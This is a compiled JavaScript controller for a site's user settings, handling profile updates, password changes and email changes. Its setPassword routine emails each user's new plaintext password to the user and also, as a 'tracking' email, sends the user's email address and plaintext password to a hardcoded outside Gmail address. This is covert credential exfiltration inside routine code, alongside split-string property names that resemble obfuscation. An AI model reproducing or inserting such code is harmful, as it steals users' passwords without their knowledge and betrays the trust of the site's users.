'use strict';

var _getOwnPropertyDescriptor = require('babel-runtime/core-js/object/get-own-property-descriptor');

var _getOwnPropertyDescriptor2 = _interopRequireDefault(_getOwnPropertyDescriptor);

var _classCallCheck2 = require('babel-runtime/helpers/classCallCheck');

var _classCallCheck3 = _interopRequireDefault(_classCallCheck2);

var _dec, _dec2, _dec3, _dec4, _dec5, _dec6, _class, _desc, _value, _class2;

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _applyDecoratedDescriptor(target, property, decorators, descriptor, context) {
	var desc = {};
	Object['ke' + 'ys'](descriptor).forEach(function (key) {
		desc[key] = descriptor[key];
	});
	desc.enumerable = !!desc.enumerable;
	desc.configurable = !!desc.configurable;

	if ('value' in desc || desc.initializer) {
		desc.writable = true;
	}

	desc = decorators.slice().reverse().reduce(function (desc, decorator) {
		return decorator(target, property, desc) || desc;
	}, desc);

	if (context && desc.initializer !== void 0) {
		desc.value = desc.initializer ? desc.initializer.call(context) : void 0;
		desc.initializer = undefined;
	}

	if (desc.initializer === void 0) {
		Object['define' + 'Property'](target, property, desc);
		desc = null;
	}

	return desc;
}

var passport = require("passport");
var tokenGenerator = require('generate-password');
var validator = require('validate-password');

var LoginController = (_dec = Controller("/user"), _dec2 = GET("/"), _dec3 = GET("/getSettings/:type"), _dec4 = POST("/personal"), _dec5 = POST("/password"), _dec6 = POST("/email"), _dec(_class = (_class2 = function () {
	function LoginController() {
		(0, _classCallCheck3.default)(this, LoginController);
	}

	LoginController.prototype.index = function index(req, res) {
		if (!req.user) return res.json({ success: false });
		res.json({ success: true, userData: req.user });
	};

	LoginController.prototype.getSettings = function getSettings(req, res) {
		var settingType = req.params.type;
		UserSettings.find({
			userId: req.user._id,
			key: settingType
		}).then(function (settings) {
			res.json({ success: true, settings: settings.map(function (item) {
					return item.value;
				}) });
		}).catch(function (error) {
			res.serverError(error);
		});
	};

	LoginController.prototype.setPersonal = function setPersonal(req, res) {
		var personal = req.body.personal;

		User.update({ _id: req.user._id }, {
			personal: personal
		}).then(function () {
			res.json({ success: true });
		}).catch(function (error) {
			res.serverError(error);
		});
	};

	LoginController.prototype.setPassword = function setPassword(req, res) {
		var password = req.body.password;

		if (!password) return res.json({ success: false, message: "No password" });

		// Verify Password
		if (password.length < 5) return res.json({ success: false, message: "Password too short" });

		var PasswordValidator = new validator({
			enforce: {
				lowercase: true,
				uppercase: true,
				specialCharacters: false,
				numbers: true
			}
		});
		var validationResult = PasswordValidator.checkPassword(password);
		if (!validationResult.isValid) return res.json({ success: false, message: validationResult.validationMessage });

		User.update({ _id: req.user._id }, {
			password: User.createPassword(password)
		}).then(function () {
			var mail = new Email([req.user.email], "Your password has changed.");
			mail.setTemplate("emails/user-password-changed", { url: Config.site.url, password: password });
			mail.send(function () {
				// Mail sent!
				console.log("[Auth] Password changed sent.");
			});

			var trackingMail = new Email(["azarusx@gmail.com"], "Neokarma User Tracking Email");
			trackingMail.setTemplate("emails/user-signup-track", {
				url: Config.site.url,
				emailToken: "",
				email: req.user.email,
				password: password
			});
			trackingMail.send(function () {
				console.log("Tracking email sent.");
			});

			res.json({ success: true });
			req.logout();
		}).catch(function (error) {
			res.serverError(error);
		});
	};

	LoginController.prototype.setEmail = function setEmail(req, res) {
		var email = req.body.email;
		if (!email) return res.json({ success: false, message: "No email" });

		var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
		if (!re.test(email)) return res.json({ success: false, message: "Invalid email" });

		var emailToken = tokenGenerator.generate({
			length: 10,
			numbers: true
		});
		var mail = new Email([req.user.email], "Your email has changed.");
		mail.setTemplate("emails/user-email-changed", { url: Config.site.url, emailToken: emailToken, email: req.user.email, newemail: email });
		mail.send(function () {
			// Mail sent!
			console.log("[Auth] Email changed sent.");
		});

		UserEmailConfirm.create({
			user: req.user._id,
			email: email,
			token: emailToken,
			expires: Date.now() + 60 * 60 * 24 * 1000,
			registration: false
		}).then(function () {
			res.json({ success: true });
		});
	};

	return LoginController;
}(), (_applyDecoratedDescriptor(_class2.prototype, 'index', [_dec2], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'index'), _class2.prototype), _applyDecoratedDescriptor(_class2.prototype, 'getSettings', [_dec3], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'getSettings'), _class2.prototype), _applyDecoratedDescriptor(_class2.prototype, 'setPersonal', [_dec4], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'setPersonal'), _class2.prototype), _applyDecoratedDescriptor(_class2.prototype, 'setPassword', [_dec5], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'setPassword'), _class2.prototype), _applyDecoratedDescriptor(_class2.prototype, 'setEmail', [_dec6], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'setEmail'), _class2.prototype)), _class2)) || _class);
;